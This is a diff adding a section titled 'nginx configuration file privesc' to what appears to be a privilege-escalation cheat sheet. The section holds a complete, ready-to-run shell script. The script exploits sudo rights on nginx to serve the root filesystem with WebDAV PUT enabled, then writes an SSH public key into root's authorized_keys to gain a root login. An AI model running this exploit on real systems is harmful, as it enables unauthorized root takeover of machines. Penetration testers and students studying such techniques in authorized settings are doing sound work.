@@ -470,3 +470,40 @@ ssh user@host # Now logins are allowed
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>nginx configuration file privesc</strong></summary>
+
+- https://github.com/DylanGrl/nginx_sudo_privesc
+```bash
+#!/bin/sh
+echo "[+] Creating configuration..."
+cat << EOF > /tmp/nginx_pwn.conf
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+        worker_connections 768;
+}
+http {
+	server {
+	        listen 1339;
+	        root /;
+	        autoindex on;
+	        dav_methods PUT;
+	}
+}
+EOF
+echo "[+] Loading configuration..."
+sudo nginx -c /tmp/nginx_pwn.conf
+echo "[+] Generating SSH Key..."
+ssh-keygen
+echo "[+] Display SSH Private Key for copy..."
+cat .ssh/id_rsa
+echo "[+] Add key to root user..."
+curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
+echo "[+] Use the SSH key to get access"
+```
+  
+</details>
